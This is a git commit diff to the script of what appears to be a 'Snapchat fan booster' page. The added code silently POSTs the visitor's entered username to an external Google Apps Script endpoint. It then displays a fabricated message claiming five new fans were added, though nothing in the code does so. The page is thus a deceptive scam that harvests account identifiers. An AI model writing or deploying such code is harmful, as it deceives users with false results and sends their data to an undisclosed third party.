69aed3d834ec2e9f5daa30bdcee83f90000be818
Jcrackers <mikeewalsh1009@gmail.com>
2025-04-23 14:18:26 +0100

    Add files via upload

--- script.js
+++ script.js
@@ -8,9 +8,21 @@ function startBoost() {
     }
   
     status.innerText = "Sending bots...";
-    
-    setTimeout(() => {
-      status.innerText = `Success! 5 new fans added you on Snapchat. Check your app, ${username}!`;
-    }, 2000);
+  
+    fetch("https://script.google.com/macros/s/AKfycbwaJkHcmf3shwi4INxb2S-1WCRn-d9TEM-gZrRS8gwxhczs8j8APVAg_ihM8AhuJMf_CA/exec", {
+      method: "POST",
+      body: JSON.stringify({ username: username }),
+      headers: {
+        "Content-Type": "application/json"
+      }
+    })
+    .then(() => {
+      setTimeout(() => {
+        status.innerText = `Success! 5 new fans added you on Snapchat. Check your app, ${username}!`;
+      }, 2000);
+    })
+    .catch(() => {
+      status.innerText = "Something went wrong. Try again later.";
+    });
   }
   
